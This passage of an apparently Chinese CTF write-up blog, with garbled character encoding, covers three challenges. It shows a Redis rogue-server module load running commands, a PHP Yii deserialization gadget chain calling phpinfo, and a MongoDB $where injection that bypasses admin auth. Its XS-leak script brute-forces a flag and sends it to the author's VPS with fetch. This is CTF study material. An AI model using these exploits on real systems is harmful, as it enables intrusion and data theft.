class="hljs-number">4</span><br><span class="hljs-number">6666</span><br>*<span class="hljs-number">4</span><br>$<span class="hljs-number">6</span><br>CONFIG      <span class="hljs-comment">//è®¾ç½®ç›®å½•</span><br>$<span class="hljs-number">3</span><br>SET<br>$<span class="hljs-number">3</span><br>dir<br>$<span class="hljs-number">5</span><br>/tmp/<br>*<span class="hljs-number">4</span><br>$<span class="hljs-number">6</span><br>config<br>$<span class="hljs-number">3</span><br>set<br>$<span class="hljs-number">10</span><br>dbfilename<br>$<span class="hljs-number">6</span><br>exp.so      <span class="hljs-comment">//ä¸Šä¼ exp.so</span><br>*<span class="hljs-number">3</span><br>$<span class="hljs-number">6</span><br>MODULE   <span class="hljs-comment">//åŠ è½½soæ–‡ä»¶</span><br>$<span class="hljs-number">4</span><br>LOAD<br>$<span class="hljs-number">11</span><br>/tmp/exp.so<br>*<span class="hljs-number">2</span><br>$<span class="hljs-number">11</span><br>system.exec   <span class="hljs-comment">//æ‰§è¡Œå‘½ä»¤</span><br>$<span class="hljs-number">14</span><br>cat$&#123;IFS&#125;/flag<br>*<span class="hljs-number">1</span><br>$<span class="hljs-number">4</span><br>quit<br><br></code></pre></div></td></tr></table></figure><p>ç”Ÿæˆpayloadåå†buuæœåŠ¡å™¨ä¸Šå¼€å¯redisæœåŠ¡<code> python rogue-server.py</code>ç­‰å¾…è¿æ¥ï¼Œå›å¤<code>FULLRESYNC</code>è¿›è¡Œå…¨é‡å¤åˆ¶ã€‚ä½†å¾ˆå¥‡æ€ªæ²¡æœ‰æ‰“å‡ºæ¥ã€‚</p><p><img src="https://img-blog.csdnimg.cn/1b9cb559e7e14dadad6f35f41e12fc59.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‰é¢å·²ç»è¿”å›okäº†ï¼Œåˆ°load soæ–‡ä»¶æ—¶å‡ºé”™äº†ã€‚ã€‚ã€‚ã€‚è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œåæ¥å‘ç°æ˜¯buué¶æœºä¸Šæ²¡æœ‰gitå‘½ä»¤æˆ‘ç”¨xshellä¼ ä¸Šå»çš„ï¼Œå¯èƒ½æ˜¯soæ–‡ä»¶çš„é—®é¢˜ã€‚exp.soæ²¡æœ‰æˆåŠŸåŠ è½½åˆ°ä»æœåŠ¡å™¨ä¸Šï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯buuç¯å¢ƒçš„é—®é¢˜ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¥¥äº‘æ¯</title>
    <link href="/2021/08/30/2021-8-30-%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <url>/2021/08/30/2021-8-30-%E7%A5%A5%E4%BA%91%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="EZyii"><a href="#EZyii" class="headerlink" title="EZyii"></a>EZyii</h1><p>ç™¾åº¦çš„é“¾å­å¯ä»¥ç›´æ¥æ‰“<a href="https://xz.aliyun.com/t/9948#toc-5">https://xz.aliyun.com/t/9948#toc-5</a></p><p><code>stopProcess</code> æ–¹æ³•ä¸­å­˜åœ¨</p><p>åˆ©ç”¨ è¿”å›å€¼å¯æ§çš„<code>__call</code> å’Œ å­—ç¬¦ä¸²è¿æ¥ç¬¦ <code>.</code> ï¼Œå°†ç›®æ ‡è½¬å‘<code>__toString</code>ï¼Œ</p><p>åœ¨è¿™é‡Œæ‰¾åˆ°äº†å¯åˆ©ç”¨ç‚¹ï¼Œè·Ÿè¿› <code>rewind</code></p><p>ä¸‹é¢æ–­ç‚¹çš„åœ°æ–¹åˆå¯ä»¥èµ°å‘å…¶ä»–ç±»ä¸­çš„ <code>rewind</code> æ–¹æ³•ï¼Œ</p><p>åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°å¾ˆç›¸ä¼¼çš„è°ƒç”¨ã€‚</p><p>è·Ÿè¿› <code>read</code> æ–¹æ³•</p><p>åˆè¦è·³å‘å…¶ä»–ç±»çš„ <code>read</code> æ–¹æ³•ã€‚</p><p>åˆ©ç”¨<code>call_user_func</code>æ‰§è¡Œå‘½ä»¤</p><p>expå¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Psr7</span>\<span class="hljs-title">AppendStream</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">RunProcess</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$output</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$processes</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;processes[]=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-keyword">new</span> AppendStream());<br>            <span class="hljs-keyword">$this</span>-&gt;output=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-string">&#x27;jiang&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> RunProcess()));<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">DefaultGenerator</span><br>&#123;<br>    <span class="hljs-title">protected</span> $<span class="hljs-title">default</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$default</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;default = <span class="hljs-variable">$default</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">GuzzleHttp</span>\<span class="hljs-title">Psr7</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">DefaultGenerator</span>;<br>    <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppendStream</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$streams</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$seekable</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;streams[]=<span class="hljs-keyword">new</span> CachingStream();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CachingStream</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$remoteStream</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;remoteStream=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-literal">false</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;stream=<span class="hljs-keyword">new</span>  PumpStream();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PumpStream</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$source</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>=-<span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$buffer</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;buffer=<span class="hljs-keyword">new</span> DefaultGenerator(<span class="hljs-string">&#x27;j&#x27;</span>);<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;closure/autoload.php&quot;</span>);<br>            <span class="hljs-variable">$a</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;phpinfo();&#125;;<br>            <span class="hljs-variable">$a</span> = \Opis\<span class="hljs-built_in">Closure</span>\serialize(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-variable">$b</span> = unserialize(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;source=<span class="hljs-variable">$b</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Package-Manager"><a href="#Package-Manager" class="headerlink" title="Package Manager"></a>Package Manager</h1><h3 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h3><p>é¢˜ç›®ç»™äº†æºç ï¼Œå®¡è®¡ä¸€ä¸‹ï¼Œé¢˜ç›®çš„ç•Œé¢é‡Œé¢æœ‰è®¸å¤šæ–‡æœ¬æ¡†ï¼Œè¿™é‡ŒçŒœæµ‹å¯ä¸å¯ä»¥xssä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†æºç ï¼Œæ‰¾åˆ°äº†è®¸å¤šï¼Œä½†éƒ½åŠ äº†#è½¬ä¹‰ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªï¼æœªè½¬ä¹‰çš„ã€‚</p><p><img src="https://img-blog.csdnimg.cn/4141920159f046c6a6391a43732bb238.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½†æ˜¯åæ¥åˆåœ¨<code>app.ts</code>é‡Œé¢å‘ç°äº†cspé˜²å¾¡å¾ˆä¸¥æ ¼ï¼ŒåŸºæœ¬æ— æ³•å®ç°xssã€‚</p><figure class="highlight typescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs typescript">app.use(<span class="hljs-function">(<span class="hljs-params">req: Request, res: Response, next: NextFunction</span>) =&gt;</span> &#123;<br>    res.locals.session = req.session;<br>    res.locals.csrfToken = req.csrfToken();<br>    res.set(<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>, <span class="hljs-string">&quot;default-src &#x27;none&#x27;;style-src &#x27;self&#x27; &#x27;sha256-GQNllb5OTXNDw4L6IIESVZXrXdsfSA9O8LeoDwmVQmc=&#x27;;img-src &#x27;self&#x27;;form-action &#x27;self&#x27;;base-uri &#x27;none&#x27;;&quot;</span>);<br>    res.set(<span class="hljs-string">&#x27;X-Content-Type-Options&#x27;</span>,<span class="hljs-string">&#x27;nosniff&#x27;</span>);<br>    next();<br>&#125;);<br></code></pre></div></td></tr></table></figure><blockquote><p>CSP çš„å®è´¨å°±æ˜¯ç™½åå•åˆ¶åº¦ï¼Œå¼€å‘è€…æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œ<strong>å“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œï¼Œ</strong>ç­‰åŒäºæä¾›ç™½åå•ã€‚å®ƒçš„å®ç°å’Œæ‰§è¡Œå…¨éƒ¨ç”±æµè§ˆå™¨å®Œæˆï¼Œå¼€å‘è€…åªéœ€æä¾›é…ç½®ã€‚</p><p>CSP å¤§å¤§å¢å¼ºäº†ç½‘é¡µçš„å®‰å…¨æ€§ã€‚æ”»å‡»è€…å³ä½¿å‘ç°äº†æ¼æ´ï¼Œä¹Ÿæ²¡æ³•æ³¨å…¥è„šæœ¬ï¼Œé™¤éè¿˜æ§åˆ¶äº†ä¸€å°åˆ—å…¥äº†ç™½åå•çš„å¯ä¿¡ä¸»æœºã€‚</p><p>ä¸¤ç§æ–¹æ³•å¯ä»¥å¯ç”¨ CSPã€‚ä¸€ç§æ˜¯é€šè¿‡ HTTP å¤´ä¿¡æ¯çš„Content-Security-Policyçš„å­—æ®µã€‚</p><ul><li><p><code>default-src</code> é™åˆ¶å…¨å±€,é»˜è®¤æ‰€æœ‰éƒ½ä¼šä½¿ç”¨è¿™ç§è§„åˆ™</p></li><li><p><code>script-src</code> é™åˆ¶JavaScriptçš„æºåœ°å€ã€‚</p></li><li><p><code>style-src</code> é™åˆ¶å±‚å æ ·å¼è¡¨æ–‡ä»¶æºã€‚</p></li><li><p><code>img-src</code> é™åˆ¶å›¾ç‰‡å’Œå›¾æ ‡çš„æºåœ°å€ç­‰ç­‰</p></li></ul><p> ä¾‹å¦‚ <strong>default-src â€˜selfâ€™;</strong>  <strong>åªå…è®¸åŒæºä¸‹çš„èµ„æº</strong></p><p> <strong>script-src â€˜selfâ€™;</strong> <strong>åªå…è®¸åŒæºä¸‹çš„js</strong></p><p> <strong>none</strong>  <strong>ä¸å…è®¸ä»»ä½•å†…å®¹ã€‚</strong></p></blockquote><p>ä½†æ˜¯è¿™é‡Œå¯ä»¥æ’å…¥<code>&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;2; URL=http://example.com/&quot; /&gt;</code> </p><p>ç„¶åç›´æ¥å…¨å±€æœç´¢äº†ä¸‹flagï¼Œå‘ç°flagå†adminç”¨æˆ·é‡Œé¢çš„ä¸€ä¸ªpageé¡µé¢ä¸Šã€‚é¢˜ç›®ä¹Ÿæä¾›äº†admin çš„xssbotï¼Œä¸”ç”¨çš„æ˜¯ç«ç‹æµè§ˆå™¨ã€‚é‚£ä¹ˆç°åœ¨æƒ…æ™¯å°±æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦æŸç§æ–¹å¼è·å¾—adminé¡µé¢çš„å†…å®¹ã€‚</p><p><img src="https://img-blog.csdnimg.cn/58b8441334b64f44b9189a2d2a318c5a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸‹é¢çš„æ“ä½œå°±è®©æˆ‘å­¦ä¹ äº†å¾ˆä¹…ï¼Œçªç ´å£åœ¨packagesè·¯ç”±ä¸­<code>/list</code>æ“ä½œé‡Œé¢ã€‚è¿™é‡Œæ¥å—äº†æŸ¥è¯¢çš„searchå‚æ•°ï¼Œç„¶åç”¨findæŸ¥è¯¢ã€‚è¿™é‡Œç”¨çš„<code>mongoose</code>æŸ¥è¯¢ï¼Œå¯ä»¥ç”¨<code>&#123;&#39;$regex&#39;:xxx&#125;</code>å®ç°æŸ¥è¯¢ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥è¿™æ ·ä¼ å…¥<code>/packages/list?search[description][$regex]=</code>æ¥è¿›è¡Œå¼‚æˆ–åŒ¹é…flagã€‚</p><blockquote><p>è¿™æ ·å°±ç¬¦åˆxsleakçš„æ€è·¯äº†ã€‚</p><p>è€Œå…·ä½“leakçš„æ–¹æ³•ã€‚æˆ‘ä»¬ä½¿ç”¨<code>object</code>æ ‡ç­¾ã€‚å®ƒèƒ½åœ¨ç«ç‹ç¯å¢ƒä¸‹åšåˆ°ï¼Œå¦‚æœ<code>object.data</code>è®¿é—®çŠ¶æ€ç 200ï¼Œå°±ä¼šè§¦å‘onloadäº‹ä»¶ã€‚å¦‚æœè®¿é—®çŠ¶æ€ç 404ï¼Œå°±ä¼šè§¦å‘onerroräº‹ä»¶ã€‚æˆ‘ä»¬æ ¹æ®è¿™ä¸ªå·®å¼‚æ€§ï¼Œå°±èƒ½åˆ©ç”¨searchæ³¨å‡ºflagå†…å®¹äº†ã€‚</p></blockquote><p><img src="https://img-blog.csdnimg.cn/f32b2d870bd64daa973fc23ffb103040.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜å°±æ˜¯éœ€è¦å°†urlæäº¤ç»™adminï¼Œè¿™é‡Œæœ‰ä¸ª<code>auth</code>çš„è¿‡æ»¤ï¼Œ$whereæ“ä½œéœ€è¦è®©tokenå’Œadminå¯†ç çš„hex_md5åçš„å€¼ç›¸ç­‰ï¼Œæ­£å¸¸è¯´è¿™æ˜¾ç„¶ä¸å¤ªå¯èƒ½ï¼Œæ‰€ä»¥è¿™é‡Œæƒ³åˆ°æ±¡æŸ“$whereæ“ä½œï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨<code>/packages/list?search[$where]=hex_md5=function()&#123;return &#39;202cb962ac59075b964b07152d234b70&#39;&#125;</code>çœŸæ˜¯å¤ªç¥å¥‡äº†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/1157c81da0c64307bf71295878e96701.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è´´ä¸€ä¸‹wpçš„æµ‹è¯•</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;Math.floor = function () &#123; return 1 &#125;; return Math.floor(0)&#x27;&#125;)<br>&#123;<br>        &quot;_id&quot; : ObjectId(&quot;5eda18529ad2bedc0477fbd0&quot;),<br>        &quot;author&quot; : &quot;test&quot;,<br>        &quot;content&quot; : &quot;poyo&quot;<br>&#125;<br>&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;return Math.floor(0)&#x27;&#125;)<br>&#123;<br>        &quot;_id&quot; : ObjectId(&quot;5eda18529ad2bedc0477fbd0&quot;),<br>        &quot;author&quot; : &quot;test&quot;,<br>        &quot;content&quot; : &quot;byc&quot;<br>&#125;<br>&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;return Math.floor(0)&#x27;&#125;)<br>&#123;<br>        &quot;_id&quot; : ObjectId(&quot;5eda18529ad2bedc0477fbd0&quot;),<br>        &quot;author&quot; : &quot;test&quot;,<br>        &quot;content&quot; : &quot;byc&quot;<br>&#125;<br>&gt; db.posts.findOne(&#123;&#x27;$where&#x27;: &#x27;return Math.floor(0)&#x27;&#125;)<br><span class="hljs-keyword">null</span><br></code></pre></div></td></tr></table></figure><p>åˆ°è¿™é‡Œæ€è·¯å¤§è‡´å°±æ˜¯å…ˆæ³¨å†Œï¼Œç„¶åaddä¸€ç¯‡æ–‡ç« ï¼Œåœ¨descriptionæ’å…¥é‡å®šå‘åˆ°æˆ‘ä»¬è‡ªå·±vpsä¸Šçš„jsè„šæœ¬ç”¨æ¨¡ç³ŠåŒ¹é…å‡ºflagï¼Œç„¶ååœ¨adminä¸‹æäº¤æˆ‘ä»¬çš„pageï¼Œè®©botè®¿é—®æˆ‘ä»¬é‡å®šå‘çš„è„šæœ¬ï¼Œæ¥è·å–flagã€‚</p><p>å…ˆæ³¨å†Œç„¶åå‘ä¸€ç¯‡æ–‡ç« ï¼Œé‡å®šå‘åˆ°æˆ‘ä»¬çš„vpsã€‚serverä¸Šå†™</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xssbotexp<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript">        vps = <span class="hljs-string">&#x27;http://39.107.239.30:80&#x27;</span></span><br><span class="javascript">        chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-+&#x27;</span></span><br><br><span class="javascript">        <span class="hljs-keyword">const</span> search = <span class="hljs-keyword">async</span> (url) =&gt;&#123;</span><br><span class="javascript">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="javascript">                <span class="hljs-keyword">const</span> object = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;object&quot;</span>);</span><br>                object.data = url;<br>                object.onload = resolve;<br>                object.onerror = reject;<br><span class="javascript">                <span class="hljs-built_in">document</span>.head.appendChild(object);</span><br>            &#125;);<br>        &#125;<br><br><span class="javascript">        <span class="hljs-keyword">const</span> exp = <span class="hljs-keyword">async</span> (url) =&gt;&#123;</span><br><span class="javascript">            <span class="hljs-keyword">try</span> &#123;</span><br><span class="javascript">              <span class="hljs-keyword">await</span> search(url)</span><br><span class="javascript">              <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="javascript">            &#125; <span class="hljs-keyword">catch</span> (e) &#123;</span><br><span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br>            &#125;<br>        &#125;<br><span class="javascript">        (<span class="hljs-keyword">async</span> () =&gt; &#123;</span><br><span class="javascript">            <span class="hljs-keyword">let</span> flag = <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="javascript">            <span class="hljs-keyword">let</span> url = <span class="hljs-string">`http://6d7f5839-9b17-40fe-b5de-b04cfdae1037.node4.buuoj.cn:81/packages/list?search[description][$regex]=^<span class="hljs-subst">$&#123;flag&#125;</span>`</span></span><br><span class="javascript">            <span class="hljs-keyword">while</span> (flag.charAt(flag.length - <span class="hljs-number">1</span>) !== <span class="hljs-string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="javascript">                <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">let</span> i <span class="hljs-keyword">of</span> chars ) &#123;</span><br><span class="javascript">                    <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">await</span>(search(url + <span class="hljs-built_in">escape</span>(i))) ) &#123;</span><br><span class="javascript">                        url = url + <span class="hljs-built_in">escape</span>(i)</span><br>                        flag += i<br><span class="javascript">                        <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">`<span class="hljs-subst">$&#123;vps&#125;</span>/?flag=<span class="hljs-subst">$&#123;flag&#125;</span>`</span>, &#123;<span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>&#125;)</span><br><span class="javascript">                        <span class="hljs-keyword">break</span>;</span><br><span class="javascript">                    &#125;   <span class="hljs-keyword">else</span> &#123;</span><br><span class="javascript">                        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;failed&#x27;</span>);</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;)();<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>å…ˆåœ¨searchç•Œé¢ä¸æ–­å‘åŒ…ç«äº‰</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/packages/list?search[$where]=hex_md5%3dfunction()&#123;return%20%27202cb962ac59075b964b07152d234b70%27&#125;;</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1a52a622-4f18-49e5-9060-3394c76b953c.node4.buuoj.cn:81<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=eyJ1Ijp7IiBiIjoiZ0FTVk13QUFBQUFBQUFDTUFtNTBsSXdHYzNsemRHVnRsSk9VakJ0bFkyaHZJQ0ErSUM5MGJYQXZNVEV4bElXVVVwUXUifX0.YJDP-g.QEEJmYHE5PkdYKgl-zKi4lybDYo; session=s%3A60hAjRd2Nlts_fWYx7o_fnfOBx1H2lEs.tibY6R1rxcarL1x%2B8ucVTkXMFIhlryODzOsyi13uoMM<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br></code></pre></div></td></tr></table></figure><p>ç›´åˆ°authæäº¤tokené€šè¿‡å³å¯</p><p><img src="https://img-blog.csdnimg.cn/80923db490644fac95f4eff48d60cc44.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åæäº¤æˆ‘ä»¬çš„æ–‡ç« 